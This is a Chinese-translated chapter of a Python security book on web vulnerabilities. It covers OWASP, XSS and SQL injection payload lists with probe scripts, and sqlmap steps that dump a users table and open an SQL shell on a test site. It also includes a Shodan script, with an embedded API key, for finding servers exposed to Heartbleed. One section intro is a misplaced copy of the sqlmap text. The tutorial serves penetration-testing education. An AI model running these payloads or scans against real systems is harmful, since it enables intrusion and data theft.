# 第十一章：识别 Web 应用程序中的服务器漏洞

本章涵盖了 Web 应用程序中的主要漏洞以及我们可以在 Python 生态系统中找到的工具，例如 w3af 作为 Web 应用程序中的漏洞扫描器，以及用于检测 SQL 漏洞的 sqlmap。关于服务器漏洞，我们将介绍如何测试启用了 openssl 的服务器中的心脏出血和 SSL 漏洞。

本章将涵盖以下主题：

+   OWASP 中的 Web 应用程序漏洞

+   w3af 作为 Web 应用程序中的漏洞扫描器

+   如何使用 Python 工具发现 SQL 漏洞

+   用于测试心脏出血和 SSL/TLS 漏洞的 Python 脚本

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter11`文件夹中找到：

[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)

您需要在本地机器上安装至少 4GB 内存的 Python 发行版。

脚本可以在 Python 2.7 和 3.x 版本中执行，w3af 在 Unix 发行版（如 Ubuntu）中进行了测试。

# 介绍 OWASP 中的 Web 应用程序漏洞

开放式 Web 应用程序安全项目（OWASP）十大是关键的网络应用程序安全风险的列表。在本节中，我们将评论 OWASP 十大漏洞，并详细解释跨站脚本（XSS）漏洞。

# 介绍 OWASP

开放式 Web 应用程序安全项目是了解如何保护您的 Web 应用程序免受不良行为的绝佳资源。有许多种应用程序安全漏洞。OWASP 在 OWASP 十大项目中排名前十的应用程序安全风险：[`www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project`](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)。

完整的分类可以在 GitHub 存储库中的章节文件夹中的共享`OWASP.xlsx` Excel 文件中找到：

![](img/2b915aec-e598-4ea1-8cd6-f7761421bff4.png)

在这里，我们可以突出以下代码：

+   **OTG-INFO-001 信息泄漏：**我们可以利用 Bing、Google 和 Shodan 等搜索引擎，使用这些搜索引擎提供的操作符或 dorks 来搜索信息泄漏。例如，我们可以查看 Shodan 给我们的信息，我们可以进行 IP 或域的搜索，并使用 Shodan 的服务来查看它公开和开放的端口。

+   **OTG-INFO-002 Web 服务器指纹识别：**我们将尝试找出我们目标网站所使用的服务器类型，为此我们使用 Kali Linux 发行版中可以找到的 whatweb 工具。

+   **OTG-INFO-003 在服务器文件中找到的元数据：**在这一点上，我们可以使用工具，如 Foca 或 Metagoofil，来提取网站上发布的文档中的元数据。

+   **OTG-INFO-004 枚举子域和服务器应用程序：**我们将使用工具来获取有关可能的子域、DNS 服务器、服务和服务器应用程序中打开的端口的信息。

+   **OTG-INFO-005 Web 的注释和元数据：**我们可以在网页的注释中找到程序员用于调试代码的泄漏信息。

+   **OTG-INFO-006 和 OTG-INFO-007 识别入口点和网站地图：**我们可以检测网页的所有入口点（使用`GET`和`POST`的请求和响应），为此我们将使用反向 Web 代理（ZAP、Burp 或 WebScarab），并使用其 Spider 生成网页的完整地图及其入口点。

+   OTG-INFO-008 指纹识别 Web 应用程序框架：这是为了找出开发 Web 所使用的框架类型，例如编程语言和技术。我们可以在 HTTP 头、cookie、HTML 代码和不同的文件和文件夹中找到所有这些信息。当我们使用 whatweb 工具时，我们可以看到 JQuery 正在使用 CMS 使用的其他特定技术。

+   OTG-INFO-009 指纹识别 Web 应用程序：这是为了找出是否使用了某种 CMS 来开发 Web：WordPress、Joomla 或其他类型的 CMS。

+   OTG-INFO-0010 服务器架构：我们可以检查通信中是否有任何防火墙。对于这个任务，我们可以进行某种类型的端口扫描，看看是否没有 Web 应用程序防火墙，例如，由于端口 80 未经过滤。

# OWASP 常见攻击

让我们来看一些最常见的攻击：

+   SQL 注入：当用户提供的数据未经过滤地发送到查询的解释器作为查询的一部分以修改原始行为，执行命令或在数据库中执行任意查询时，就会发生 SQL 代码的注入。攻击者在请求中发送原始的 SQL 语句。如果您的服务器使用请求内容构建 SQL 查询，可能会执行攻击者在数据库上的请求。但是，在 Python 中，如果您使用 SQLAlchemy 并完全避免原始的 SQL 语句，您将是安全的。如果使用原始的 SQL，请确保每个变量都正确引用。我们可以在[`www.owasp.org/index.php/SQL_Injection`](https://www.owasp.org/index.php/SQL_Injection)找到更多关于这种类型注入的信息和 owasp 文档。

+   跨站脚本（XSS）：这种攻击只发生在显示一些 HTML 的网页上。攻击者使用一些查询属性来尝试在页面上注入他们的一段`javascript`代码，以欺骗用户执行一些动作，认为他们在合法的网站上。XSS 允许攻击者在受害者的浏览器中执行脚本，从而劫持用户会话，破坏网站，或将用户重定向到恶意网站（[`www.owasp.org/index.php/XSS`](https://www.owasp.org/index.php/XSS)）。

+   跨站请求伪造（XSRF/CSRF）：这种攻击是基于通过重用用户在另一个网站上的凭据来攻击服务。典型的 CSRF 攻击发生在 POST 请求中。例如，恶意网站向用户显示一个链接，以欺骗用户使用其现有凭据在您的网站上执行 POST 请求。CSRF 攻击迫使经过身份验证的受害者的浏览器发送伪造的 HTTP 请求，包括用户的会话 cookie 和任何其他自动包含的身份验证信息，到一个易受攻击的 Web 应用程序。这允许攻击者强制受害者的浏览器生成易受攻击应用程序解释为合法的请求（[`www.owasp.org/index.php/CSRF`](https://www.owasp.org/index.php/CSRF)）。

+   敏感数据泄露：许多 Web 应用程序未能充分保护敏感数据，如信用卡号或身份验证凭据。攻击者可以窃取或修改这些数据以进行欺诈、身份盗用或其他犯罪行为。敏感数据需要额外的保护方法，如数据加密，以及在与浏览器交换数据时的特殊预防措施（[`www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure`](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure)）。

+   未经验证的重定向和转发：Web 应用程序经常将用户重定向和转发到其他页面或网站，并使用不受信任的数据来确定着陆页面。如果没有适当的验证，攻击者可以将受害者重定向到钓鱼或恶意软件网站，或者使用转发访问未经授权的页面。

+   **命令注入攻击。** 命令注入是指在使用 popen、subprocess、os.system 调用进程并从变量中获取参数时。在调用本地命令时，有可能有人将这些值设置为恶意内容([`docs.python.org/3/library/shlex.html#shlex.quote`](https://docs.python.org/3/library/shlex.html#shlex.quote))。

有关 python 和 Django 应用程序中 XSS 和 CSRF 漏洞的更多信息，请参阅[`docs.djangoproject.com/en/2.1/topics/security/`](https://docs.djangoproject.com/en/2.1/topics/security/)。

# 测试跨站脚本（XSS）

跨站脚本是一种注入攻击类型，当攻击向量以浏览器端脚本的形式注入时发生。

要测试网站是否容易受到 XSS 攻击，我们可以使用以下脚本，从一个包含所有可能攻击向量的`XSS-attack-vectors.txt`文件中读取。如果由于向网站发出请求以及有效负载一起分析的结果，我们获得的信息与用户发送的信息相同，并再次显示给用户，那么我们就有一个明显的漏洞案例。

您可以在 XXS 文件夹的`URL_xss.py`文件中找到以下代码：

```py
import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer
url = 'http://testphp.vulnweb.com/search.php?test=query'
data ={}

response = requests.get(url)
with open('XSS-attack-vectors.txt') as file:
    for payload in file:
        for field in BeautifulSoup(response.text, "html.parser",parse_only=SoupStrainer('input')):
            print(field)
            if field.has_attr('name'):
                if field['name'].lower() == "submit":
                    data[field['name']] = "submit"
                else:
                    data[field['name']] = payload

        response = requests.post(url, data=data)
        if payload in response.text:
            print("Payload "+ payload +" returned")
        data ={}
```

您可以在 XXS 文件夹的`XSS-attack-vectors.txt`文件中找到以下代码：

```py
<SCRIPT>alert('XSS');</SCRIPT>
<script>alert('XSS');</script>
<BODY ONLOAD=alert('XSS')>
<scrscriptipt>alert('XSS');</scrscriptipt>
<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
```

在这个截图中，我们可以看到之前脚本`URL_xss.py`的执行情况：

![](img/d22b7045-b6a2-427f-ab05-2595f5ed2bdd.png)

我们可以在[testphp.vulnweb.com](http://testphp.vulnweb.com)网站上检查这个漏洞：

![](img/4f155b6d-6355-499a-81c3-e800dd3c1e6e.png)

如果我们在搜索字段中输入其中一个向量攻击，我们可以看到我们获得了执行我们在脚本标签之间注入的相同代码：

![](img/26962f04-15c8-48bd-9488-58a474d46494.png)

# W3af 扫描器对 web 应用程序的漏洞

W3af 是 web 应用程序攻击和审计框架的缩写，是一个开源漏洞扫描器，可用于审计 web 安全。

# W3af 概述

W3af 是一个用于 web 应用程序的安全审计工具，它分为几个模块，如`Attack`、`Audit`、`Exploit`、`Discovery`、`Evasion`和`Brute Force`。W3af 中的这些模块都带有几个次要模块，例如，如果我们需要在 web 应用程序中测试跨站脚本（XSS）漏洞，我们可以在`Audit`模块中选择 XSS 选项，假设需要执行某个审计。

W3af 的主要特点是其审计系统完全基于用 Python 编写的插件，因此它成功地创建了一个易于扩展的框架和一个用户社区，他们为可能发生的 web 安全故障编写新的插件。

检测和利用可用插件的漏洞包括：

+   CSRF

+   XPath 注入

+   缓冲区溢出

+   SQL 注入

+   XSS

+   LDAP 注入

+   远程文件包含

在这个截图中，我们可以看到 w3af 官方网站和文档链接：

![](img/4d29bcb2-5cab-45c8-ba3d-036cbb91b4a6.png)

我们有一组预配置的配置文件，例如 OWASP TOP 10，它执行全面的漏洞分析：

![](img/60a25426-fe4c-417e-985e-f8afad4701a5.png)

它是一个允许对 web 应用程序进行不同类型测试的框架，以确定该应用程序可能存在的漏洞，根据可能对 web 基础设施或其客户端的影响程度详细说明了关键级别。

一旦分析完成，w3af 会显示关于在指定网站上发现的漏洞的详细信息，这些漏洞可能会因为额外的利用而受到威胁。

在结果选项卡中，我们可以看到对特定网站的扫描结果：

![](img/acf93d31-c708-404c-9492-ea5c7b3f443f.png)

在**描述**选项卡中，我们可以看到 SQL 注入漏洞的描述：

![](img/94da4ae4-bc19-4f9b-9bbd-f92f6e6365cd.png)

我们还在网站上获得了**跨站脚本（XSS）漏洞**：

![](img/7702703b-6961-4b6d-b6af-1410cadf3dfc.png)

这份分析结果的完整报告可在共享的**testphp_vulnweb_com.pdf**文件中找到。

在这份报告中，我们可以看到所有检测到的漏洞影响的文件，比如 SQL 注入：

![](img/3fa55c17-584b-4b98-9473-a5472a7cdc63.png)

# W3AF 配置文件

W3AF 中的配置文件是已保存的插件配置，专注于特定目标的配置。这些类型的关联是在启动信息收集过程时进行的。使用配置文件允许我们只启用对一个目标有趣的插件，而停用其余的插件。

在配置文件中，我们可以强调：

+   **bruteforce:** 它允许我们通过暴力破解过程从认证表单中获取凭据。

+   **audit_high_risk:** 允许您识别最危险的漏洞，比如 SQL 注入和 XSS。

+   **full_audit_manual_disc:** 它允许我们手动进行发现，并探索网站以寻找已知的漏洞。

+   **full_audit:** 它允许使用 webSpider 插件对网站进行完整的审计。

+   **OWASP_TOP10：** 允许您搜索主要的 OWASP 安全漏洞。有关安全漏洞的更多信息，请查看：[`www.owasp.org/index.php/OWASP_Top_Ten_Project`](http://www.owasp.org/index.php/OWASP_Top_Ten_Project)。

+   **web_infrastructure:** 使用所有可用的技术来获取 web 基础设施的指纹。

+   **fast_scan:** 它允许我们对网站进行快速扫描，只使用最快的审计插件。

# W3af 安装

W3af 是一个需要许多依赖项的 Python 工具。有关安装 w3af 的具体细节可以在官方文档中找到：[`docs.w3af.org/en/latest/install.html`](http://docs.w3af.org/en/latest/install.html)。

安装它的要求是：

+   Python 2.5 或更高版本**：** `apt-get install python`

+   Python 包**：** `apt-get install nltk python-nltk python-lxml python-svn python-fpconst python-pygooglechart python-soappy python-openssl python-scapy python-lxml python-svn`

源代码可在 GitHub 存储库中找到（[`github.com/andresriancho/w3af`](https://github.com/andresriancho/w3af)）：

![](img/563e241a-542c-4a2d-9d58-1d6510fed56f.png)

现在，为了证明整个环境已经正确配置，只需转到下载了框架的目录并执行`./w3af_console`命令。

如果发现环境中所有库都正确配置，这将打开准备接收命令的 w3af 控制台。要从相同目录执行 GTK 界面，请执行`./w3af_gui`。

这个命令将打开我们在概述部分看到的图形用户界面。

# Python 中的 W3af

要从任何 Python 脚本中使用 W3AF，需要了解其实现的某些细节，以及允许与框架进行编程交互的主要类。

框架中包含几个类，然而，管理整个攻击过程最重要的是`core.controllers.w3afCore`模块的`w3afCore`类。该类的实例包含启用插件、建立攻击目标、管理配置文件以及最重要的启动、中断和停止攻击过程所需的所有方法和属性。

[`github.com/andresriancho/w3af-module`](https://github.com/andresriancho/w3af-module)

我们可以在 GitHub 存储库的此文件夹中找到主控制器：

[`github.com/andresriancho/w3af-module/tree/master/w3af-repo/w3af/core/controllers`](https://github.com/andresriancho/w3af-module/tree/master/w3af-repo/w3af/core/controllers)

`w3afCore`类的一个实例具有 plugins 属性，允许执行多种类型的操作，如列出特定类别的插件、激活和停用插件或为可配置的插件设置配置选项。

您可以在 w3af 文件夹中的`w3af_plugins.py`文件中找到以下代码：

```py
from w3af.core.controlles.w3afCore import w3afCore

w3af = w3afCore()

#list of plugins in audit category
pluginType = w3af.plugins.get_plugin_list('audit')
for plugin in pluginType:
    print 'Plugin:'+plugin

#list of available plugin categories
plugins_types = w3af.plugins.get_plugin_types()
for plugin in plugins_types:
    print 'Plugin type:'+plugin

#list of enabled plugins
plugins_enabled = w3af.plugins.get_enabled_plugin('audit')
for plugin in plugins_enabled:
    print 'Plugin enabled:'+plugin
```

w3af 的另一个有趣功能是它允许您管理配置文件，其中包括启用的配置文件和攻击目标对应的配置。

您可以在 GitHub 存储库中的 w3af 文件夹中的`w3af_profiles.py`文件中找到以下代码：

```py
from w3af.core.controlles.w3afCore import w3afCore

w3af = w3afCore()

#list of profiles
profiles = w3af.profiles.get_profile_list()
for profile in profiles:
    print 'Profile desc:'+profile.get_desc()
    print 'Profile file:'+profile.get_profile_file()
    print 'Profile name:'+profile.get_name()
    print 'Profile target:'+profile.get_target().get("target")

w3af.profiles.use_profile('profileName')
w3af.profiles.save_current_to_new_profile('profileName','Profile description')
```

# 使用 Python 工具发现 SQL 漏洞

本节介绍了如何使用 sqlmap 渗透测试工具测试网站是否安全免受 SQL 注入攻击。sqlmap 是一种自动化工具，用于查找和利用注入值在查询参数中的 SQL 注入漏洞。

# SQL 注入简介

OWASP 十大将注入作为第一风险。如果应用程序存在 SQL 注入漏洞，攻击者可以读取数据库中的数据，包括机密信息和散列密码（或更糟糕的是，应用程序以明文形式保存密码）。

SQL 注入是一种利用未经验证的输入漏洞来窃取数据的技术。这是一种代码注入技术，攻击者通过执行恶意的 SQL 查询来控制 Web 应用程序的数据库。通过一组正确的查询，用户可以访问数据库中存储的信息。例如，考虑以下`php 代码`段：

```py
$variable = $_POST['input'];
mysql_query("INSERT INTO `table` (`column`) VALUES ('$variable')");
```

如果用户输入`“value’); DROP TABLE table;–”`作为输入，原始查询将转换为一个 SQL 查询，我们正在更改数据库：

```py
INSERT INTO `table` (`column`) VALUES('value'); DROP TABLE table;--')
```

# 识别易受 SQL 注入攻击的页面

识别具有 SQL 注入漏洞的网站的一个简单方法是向 URL 添加一些字符，例如引号、逗号或句号。例如，如果页面是用 PHP 编写的，并且您有一个传递搜索参数的 URL，您可以尝试在末尾添加一个参数。

进行注入基本上将使用 SQL 查询，例如 union 和 select 以及著名的 join。只需在页面的 URL 中进行操作，例如输入以下行，直到找到上面显示的错误并找到易受访问的表的名称。

如果您观察到[`testphp.vulnweb.com/listproducts.php?cat=1`](http://testphp.vulnweb.com/listproducts.php?cat=1)，其中'GET'参数 cat 可能容易受到 SQL 注入攻击，攻击者可能能够访问数据库中的信息。

检查您的网站是否易受攻击的一个简单测试是将 get 请求参数中的值替换为星号(*)。例如，在以下 URL 中：

[`testphp.vulnweb.com/listproducts.php?cat=*`](http://testphp.vulnweb.com/listproducts.php?cat=*)

如果这导致类似于前面的错误，我们可以断定该网站易受 SQL 注入攻击。

在这个屏幕截图中，当我们尝试在易受攻击的参数上使用攻击向量时，我们可以看到数据库返回的错误：

![](img/80922e96-f6b7-442b-afd3-8aab9b8ef063.png)

使用 Python，我们可以构建一个简单的脚本，从`sql-attack-vector.txt`文本文件中读取可能的 SQL 攻击向量，并检查注入特定字符串的输出结果。目标是从识别易受攻击的参数的 URL 开始，并将原始 URL 与攻击向量组合在一起。

您可以在`sql_injection`文件夹中的`test_url_sql_injection.py`文件中找到以下代码：

```py
import requests url = "http://testphp.vulnweb.com/listproducts.php?cat="

with open('sql-attack-vector.txt') as file:
for payload in file:
    print ("Testing "+ url + payload)
    response = requests.post(url+payload)
    #print(response.text)
    if "mysql" in response.text.lower():
        print("Injectable MySQL detected")
        print("Attack string: "+payload)
    elif "native client" in response.text.lower():
        print("Injectable MSSQL detected")
        print("Attack string: "+payload)
    elif "syntax error" in response.text.lower():
        print("Injectable PostGRES detected")
        print("Attack string: "+payload)
    elif "ORA" in response.text.lower():
        print("Injectable Oracle detected")
        print("Attack string: "+payload)
    else:
        print("Not Injectable")
```

您可以在`sql_injection`文件夹中的`sql-attack-vector.txt`文件中找到以下代码：

```py
" or "a"="a
" or "x"="x
" or 0=0 #
" or 0=0 --
" or 1=1 or ""="
" or 1=1--
```

执行`test_url_sql_injection.py`时，我们可以看到易受多个向量攻击的可注入 cat 参数：

![](img/83c0687c-c1ef-4791-89f7-348735a48ee7.png)

# 介绍 SQLmap

SQLmap 是用 Python 编写的最著名的工具之一，用于检测漏洞，例如 SQL 注入。为此，该工具允许对 URL 的参数进行请求，这些参数通过 GET 或 POST 请求指示，并检测某些参数是否容易受攻击，因为参数未正确验证。此外，如果它检测到任何漏洞，它有能力攻击服务器以发现表名，下载数据库，并自动执行 SQL 查询。

在[`sqlmap.org`](http://sqlmap.org)了解更多关于 sqlmap 的信息。

Sqlmap 是一个用 Python 编写的自动化工具，用于查找和利用 SQL 注入漏洞。它可以使用各种技术来发现 SQL 注入漏洞，例如基于布尔的盲目、基于时间的、基于 UNION 查询的和堆叠查询。

Sqlmap 目前支持以下数据库：

+   MySQL

+   Oracle

+   PostgreSQL

+   Microsoft SQL Server

一旦它在目标主机上检测到 SQL 注入，您可以从各种选项中进行选择：

+   执行全面的后端 DBMS 指纹

+   检索 DBMS 会话用户和数据库

+   枚举用户、密码哈希、权限和数据库

+   转储整个 DBMS 表/列或用户特定的 DBMS 表/列

+   运行自定义 SQL 语句

# 安装 SQLmap

Sqlmap 预装在一些面向安全任务的 Linux 发行版中，例如 kali linux，这是大多数渗透测试人员的首选。但是，您可以使用`apt-get`命令在其他基于 debian 的 Linux 系统上安装`sqlmap`：

```py
sudo apt-get install sqlmap
```

我们也可以从 GitHub 存储库的源代码中安装它 - [`github.com/sqlmapproject/sqlmap`](https://github.com/sqlmapproject/sqlmap)：

```py
git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

您可以使用`-h`选项查看可以传递给`sqlmap.py`脚本的参数集：

![](img/35e8831c-fbcd-4b4e-bdd7-781048bcc6a8.png)

我们将用于基本 SQL 注入的参数如前图所示：

![](img/d0f18985-5ff0-41f4-9979-00d00ff45700.png)

# 使用 SQLMAP 测试网站的 SQL 注入漏洞

这些是我们可以遵循的主要步骤，以获取有关潜在 SQL 注入漏洞的数据库的所有信息：

**步骤 1：列出现有数据库的信息**

首先，我们必须输入要检查的 Web URL，以及-u 参数。我们还可以使用`--tor`参数，如果希望使用代理测试网站。现在通常，我们希望测试是否可能访问数据库。对于此任务，我们可以使用`--dbs`选项，列出所有可用的数据库。

`sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs`

通过执行上一个命令，我们观察到存在两个数据库，`acuart`和`information_schema`：

![](img/d2cb69e2-3cbd-46b4-ac35-36d1b451aea0.png)

我们得到以下输出，显示有两个可用的数据库。有时，应用程序会告诉您它已经识别了数据库，并询问您是否要测试其他数据库类型。您可以继续输入“Y”。此外，它可能会询问您是否要测试其他参数以查找漏洞，请在此处输入“Y”，因为我们希望彻底测试 Web 应用程序。

**步骤 2：列出特定数据库中存在的表的信息**

要尝试访问任何数据库，我们必须修改我们的命令。我们现在使用-D 来指定我们希望访问的数据库的名称，一旦我们访问了数据库，我们希望看看是否可以访问表。

对于此任务，我们可以使用`--tables`查询来访问 acuart 数据库：

```py
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart --tables
```

在下图中，我们看到已恢复了八个表。通过这种方式，我们确切地知道网站是易受攻击的：

![](img/fe550ac2-0495-41f8-ac80-aea3322b5a87.png)

**步骤 3：列出特定表的列信息**

如果我们想要查看特定表的列，我们可以使用以下命令，其中我们使用`-T`来指定表名，并使用**`--columns`**来查询列名。

这是我们可以尝试访问‘users’表的命令：

```py
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart -T users
--columns
```

**步骤 4：从列中转储数据**

同样，我们可以使用以下命令访问特定表中的所有信息，其中`**--dump`查询检索用户表中的所有数据：

```py
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump
```

从以下图片中，我们可以看到我们已经访问了数据库中的数据：

![](img/6c92aa64-3640-4011-9c2d-9184315084b5.png)

# 其他命令

同样，在易受攻击的网站上，我们可以通过其他命令从数据库中提取信息。

使用此命令，我们可以从数据库中获取所有用户：

```py
$ python sqlmap.py -u [URL] --users
sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=*" --users
```

在这里，我们获得了在数据库管理系统中注册的用户：

![](img/3d67ef38-867a-4907-aa9f-5277b7e4b8c1.png)

使用此命令，我们可以从表中获取列：

```py
$ python sqlmap.py -u [URL] -D [Database] -T [table] --columns
sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=*" -D acuart -T users --columns
```

在这里，我们从用户表中获取列：

![](img/948d4ea1-9b96-47c7-9ad7-e817d5366bd5.png)

使用此命令，我们可以获得一个交互式 shell：

```py
$ python sqlmap.py -u [URL] --sql-shell
sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=*" --sql-shell
```

在这里，我们获得一个与数据库交互的 shell，使用 sql 语言查询：

![](img/18f7991f-639c-4f3a-8c3a-4efdafa79d07.png)

# 其他用于检测 SQL 注入漏洞的工具

在 Python 生态系统中，我们可以找到其他工具，例如 DorkMe 和 Xsscrapy，用于发现 SQL 注入漏洞。

# DorkMe

DorkMe 是一个旨在通过 Google Dorks 更轻松地搜索漏洞的工具，例如 SQL 注入漏洞([`github.com/blueudp/DorkMe`](https://github.com/blueudp/DorkMe))。

您还需要安装`pip install Google-Search-API` Python 包。

我们可以使用`requirements.txt`文件检查依赖项并安装它们：

```py
pip install -r requirements.txt
```

这是脚本提供的选项：

![](img/f3dcb505-a57c-47a1-9d7b-4a38abce9acd.png)

我们可以检查在上一节中使用 sqlmap 的相同`url`。我们可以使用建议用于测试的`--dorks vulns -v`选项参数：

```py
python DorkMe.py --url http://testphp.vulnweb.com/listproducts.php --dorks vulns -v
```

我们可以看到我们获得了高影响力的 SQL 注入漏洞：

![](img/3a242171-0cd7-42ea-b572-43668e9098b0.png)

# XSScrapy

XSScrapy 是基于 Scrapy 的应用程序，允许我们发现 XSS 漏洞和 SQL 注入类型的漏洞。

源代码可在 GitHub 存储库中找到：[`github.com/DanMcInerney/xsscrapy`](https://github.com/DanMcInerney/xsscrapy)。

在我们的机器上安装它，我们可以克隆存储库并执行`python pip`命令，以及包含应用程序使用的 Python 依赖项和模块的`requirements.txt`文件：

```py
$ git clone https://github.com/DanMcInerney/xsscrapy.git
$ pip install -r requirements.txt
```

您需要安装的主要依赖项之一是`scrapy`：[`scrapy.org/`](https://scrapy.org/)。

Scrapy 是 Python 的一个框架，允许您`执行网页抓取任务、网络爬虫过程和数据分析`。它允许我们递归扫描网站的内容，并对这些内容应用一组规则，以提取对我们有用的信息。

这些是 Scrapy 中的主要元素：

+   **解释器：**允许快速测试，以及创建具有定义结构的项目。

+   **蜘蛛：**负责向客户端提供的域名列表发出 HTTP 请求并对从 HTTP 请求返回的内容应用规则的代码例程，规则以正则表达式或 XPATH 表达式的形式呈现。

+   **XPath 表达式：**使用 XPath 表达式，我们可以获得我们想要提取的信息的相当详细的级别。例如，如果我们想要从页面中提取下载链接，只需获取元素的 Xpath 表达式并访问 href 属性即可。

+   **Items:** Scrapy 使用一种基于 XPATH 表达式的机制，称为“**Xpath 选择器**”。这些选择器负责应用开发人员定义的 Xpath 规则，并组成包含提取的信息的 Python 对象。项目就像信息的容器，它们允许我们存储遵循我们应用的规则的信息，当我们返回正在获取的内容时。它们包含我们想要提取的信息字段。

在此截图中，我们可以看到官方网站上最新的 scrapy 版本：

![](img/de0b41a1-c16d-4835-9c8e-5a4f242152d4.png)

您可以使用`pip install scrapy`命令安装它。它也可以在 conda 存储库中找到，并且您可以使用`conda install -c conda-forge scrapy`命令进行安装。

XSScrapy 在命令行模式下运行，并具有以下选项：

![](img/a40b68a3-b0cb-44c2-9a82-552111ab4e38.png)

最常用的选项是对要分析的 URL(`-u`/url)进行参数化，从根 URL 开始，该工具能够跟踪内部链接以分析后续链接。

另一个有趣的参数是允许我们建立对我们正在分析的站点的最大同时连接数(`-c`/-connections)，这对于防止防火墙或 IDS 系统检测攻击并阻止来自发起攻击的 IP 的请求非常实用。

此外，如果网站需要身份验证（摘要或基本），则可以使用`-l`（登录）和`-p`（密码）参数指示用户登录和密码。

我们可以尝试使用我们之前发现 XSS 漏洞的网站执行此脚本：

```py
python xsscrapy.py -u http://testphp.vulnweb.com
```

在执行此脚本时，我们可以看到它检测到一个 php 网站中的`sql`注入：

![](img/1a57a179-98cb-4e8c-8483-d854e6e6ffdf.png)

此分析的执行结果可在 GitHub 存储库中的`testphp.vulnweb.com.txt`共享文件中找到。

# 测试 heartbleed 和 SSL/TLS 漏洞

本节解释了如何使用 sqlmap 渗透测试工具测试网站是否安全免受 SQL 注入的影响。sqlmap 是一种自动化工具，用于查找和利用在查询参数中注入值的 SQL 注入漏洞。

# 介绍 OpenSSL

Openssl 是 SSL 和 TLS 协议的实现，广泛用于各种类型的服务器；互联网上相当高比例的服务器使用它来确保客户端和服务器之间使用强加密机制进行通信。

然而，它是一种在其多年的发展中多次遭到侵犯的实现，影响了用户信息的保密性和隐私。已公开的一些漏洞已经得到了纠正；然而，应该应用于易受攻击的 OpenSSL 版本的安全补丁并没有被迅速应用，因此在 Shodan 上可以找到易受攻击的服务器。

# 在 Shodan 中查找易受攻击的服务器

我们可以轻松地编写一个脚本，获取由于易受攻击的 OpenSSL 版本而可能易受 heartbleed 影响的服务器的结果。

在`heartbleed_shodan`文件夹中的`ShodanSearchOpenSSL.py`文件中可以找到以下代码：

```py
import shodan
import socket
SHODAN_API_KEY = "v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik"
api = shodan.Shodan(SHODAN_API_KEY)
# Wrap the request in a try/ except block to catch errors
try:
    # Search Shodan OpenSSL/1.0.1
    results = api.search('OpenSSL/1.0.1')
    # Show the results
    print('Total Vulnerable servers: %s' % results['total'])
    for result in results['matches']:
        print('IP: %s' % result['ip_str'])
        print('Hostname: %s' % socket.getfqdn(result['ip_str']))
        print(result['data'])
except shodan.APIError as e:
    print('Error: %s' % e)
```

正如您在这张图片中所看到的，可以受到影响且具有 OpenSSL v1.0 的服务器总数为 3,900：

![](img/25ef6860-8d38-4e66-aab8-9f6a4e6ff8f7.png)

如果我们从 Web 界面发出请求，我们会看到更多结果：

![](img/7875cba2-8c33-4114-b7ba-2bb5478a06d7.png)

攻击者可以尝试访问这些服务器中的任何一个；为此，可以使用位于[`www.exploit-db.com/exploits/32745`](https://www.exploit-db.com/exploits/32745)URL 中的漏洞利用。在下一节中，我们将分析此漏洞以及如何利用它。

# Heartbleed 漏洞（OpenSSL CVE-2014-0160）

漏洞 CVE-2014-0160，也称为 Heartbleed，被认为是迄今为止互联网上最严重的安全故障之一。

这是`OpenSSL`软件包中最严重的漏洞之一。要了解此漏洞的影响，有必要了解“HeartBeat”扩展的运作方式，这一扩展一直是 OpenSSL 运作的核心要素，因为它允许我们改进使用加密通道（如 SSL）的客户端和服务器的性能。

要与服务器建立 SSL 连接，必须完成一个称为“握手”的过程，其中包括对称和非对称密钥的交换，以建立客户端和服务器之间的加密连接。这个过程在时间和计算资源方面非常昂贵。

HeartBeat 是一种机制，它允许我们优化握手建立的时间，以便允许服务器指示 SSL 会话在客户端使用时必须保持。

该机制是客户端插入有效负载并在结构的一个字段中指示所述有效负载的长度。随后，服务器接收所述数据包，并负责使用称为`TLS1_HB_RESPONSE`的结构组成响应消息，该结构将仅由`TLS1_HB_REQUEST`结构长度中指示的“n”字节组成。

OpenSSL 中引入的实现问题在于未正确验证`TLS_HB_REQUEST`结构中发送的数据的长度，因为在组成`TLS1_HB_RESPONSE`结构时，服务器负责定位服务器内存中`TLS_HB_REQUEST`结构的确切位置，并根据长度字段中设置的值读取有效负载所在的字段的“n”字节。

这意味着攻击者可以发送一个带有数据字节的有效负载，并在长度字段中设置任意值，通常小于或等于 64 k 字节，服务器将发送一个带有 64 k 字节信息的`TLS1_HB_RESPONSE`消息，该信息存储在服务器的内存中。

这些数据可能包含敏感用户信息和系统密码，因此这是一个非常严重的漏洞，影响了数百万服务器，因为 OpenSSL 是 Apache 和 Ngnix 服务器广泛使用的实现。正如我们在 Shodan 中看到的，今天仍然有使用 1.0.1 版本的服务器，其中大多数可能是易受攻击的。

您可以在`heartbleed_shodan`文件夹中的`Test_heartbeat_vulnerability.py`中找到代码。

该脚本尝试在指定端口与服务器进行握手，并且随后负责发送一个带有恶意结构`TLS1_HB_REQUEST`的数据包。

如果服务器返回的数据包是“24”类型，则表示它是带有`TLS1_HB_RESPONSE`结构的响应，在请求数据包中发送的有效负载大小大于响应有效负载的大小时，可以认为服务器是易受攻击的，并且已返回与服务器内存相关的信息，否则可以假定服务器已处理了恶意请求，但没有返回任何额外的数据。这表明没有信息泄漏，服务器不易受攻击。

在易受攻击的服务器上运行脚本后，输出将类似于此处显示的输出：

![](img/57aa2e26-1164-4706-b971-7857370875aa.png)

